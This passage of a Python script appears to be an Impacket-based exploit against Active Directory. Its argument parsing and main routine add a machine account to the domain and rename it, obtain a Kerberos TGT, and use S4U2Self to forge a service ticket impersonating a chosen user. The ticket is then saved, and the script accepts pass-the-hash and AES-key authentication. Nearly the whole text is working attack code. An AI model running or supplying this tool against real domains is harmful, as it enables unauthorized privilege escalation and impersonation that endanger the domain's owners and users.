    parser.add_argument("-scan", action="store_true", help="Scan the DC")
    parser.add_argument(
        "-spn",
        action="store",
        help="SPN (service/server) of the target service the "
        "service ticket will"
        " be generated for",
    )
    parser.add_argument(
        "-impersonate",
        action="store",
        help="target username that will be impersonated (through S4U2Self)"
        " for quering the ST. Keep in mind this will only work if "
        "the identity provided in this scripts is allowed for "
        "delegation to the SPN specified",
    )
    parser.add_argument(
        "-domain-netbios",
        action="store",
        metavar="NETBIOSNAME",
        help="Domain NetBIOS name. Required if the DC has multiple domains.",
    )
    parser.add_argument(
        "-computer-name",
        action="store",
        metavar="NEW-COMPUTER-NAME$",
        help="Name of new computer. "
        "If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.",
    )
    parser.add_argument(
        "-computer-pass",
        action="store",
        metavar="password",
        help="Password to set to computer. "
        "If omitted, a random [A-Za-z0-9]{32} will be used.",
    )
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
    parser.add_argument(
        "-method",
        choices=["SAMR", "LDAPS"],
        default="SAMR",
        help="Method of adding the computer. "
        "SAMR works over SMB. "
        "LDAPS has some certificate requirements "
        "and isn't always available.",
    )
    parser.add_argument(
        "-port",
        type=int,
        choices=[139, 445, 636],
        help="Destination port to connect to. SAMR defaults to 445, LDAPS to 636.",
    )

    group = parser.add_argument_group("LDAP")
    group.add_argument(
        "-baseDN",
        action="store",
        metavar="DC=test,DC=local",
        help="Set baseDN for LDAP. "
        "If ommited, the domain part (FQDN) "
        "specified in the account parameter will be used.",
    )
    group.add_argument(
        "-computer-group",
        action="store",
        metavar="CN=Computers,DC=test,DC=local",
        help="Group to which the account will be added. "
        "If omitted, CN=Computers will be used,",
    )

    group = parser.add_argument_group("authentication")

    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on account parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key to use for Kerberos Authentication " "(128 or 256 bits)",
    )
    group.add_argument(
        "-dc-host",
        action="store",
        metavar="hostname",
        help="FQDN of the domain controller to target.",
        required=True,
    )
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip",
        help="IP of the domain controller to use. "
        "Useful if you can't translate the FQDN."
        "specified in the account parameter will be used",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.account)

    try:
        if domain is None or domain == "":
            logging.critical("Domain should be specified!")
            sys.exit(1)

        dc_ip = options.dc_ip
        if dc_ip is None:
            dc_ip = options.dc_host

        if dc_ip is None:
            logging.critical("-dc-ip or -dc-host should be specified!")
            sys.exit(1)

        if options.scan is not True and (
            options.spn is None or options.impersonate is None
        ):
            logging.critical("-spn and -impersonate should be specified!")
            sys.exit(1)

        if (
            password == ""
            and username != ""
            and options.hashes is None
            and options.no_pass is False
            and options.aesKey is None
        ):
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        lmhash, nthash = "", ""
        if options.hashes is not None:
            lmhash, nthash = options.hashes.split(":")

        if options.scan is True:
            scan(username, password, domain, lmhash, nthash, dc_ip)
            sys.exit(0)

        ma = MachineAccount(username, password, domain, options)
        ma.add()

        userName = Principal(
            ma.computerName,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value,
        )

        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            userName, ma.computerPassword, ma.domain, "", "", kdcHost=ma.kdcHost
        )
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        client = Principal()
        client.from_asn1(decodedTGT, "crealm", "cname")

        logging.info("Got TGT for %s" % client)
        options.force_forwardable = False
        options.additional_ticket = None

        ma.rename()

        tgs, cipher, oldSessionKey, sessionKey = S4U2Self(
            tgt,
            ma.computerName,
            ma.domain,
            options.spn,
            options.impersonate,
            cipher,
            sessionKey,
            options.dc_ip,
        )

        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        client = Principal()
        client.from_asn1(decodedTGS, "crealm", "cname")

        oldComputerName = ma.computerName
        ma.computerName = ma.newComputerName
        ma.newComputerName = oldComputerName
        ma.rename()

        fileName = str(client)

        saveTicket(tgs, oldSessionKey, fileName)

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))
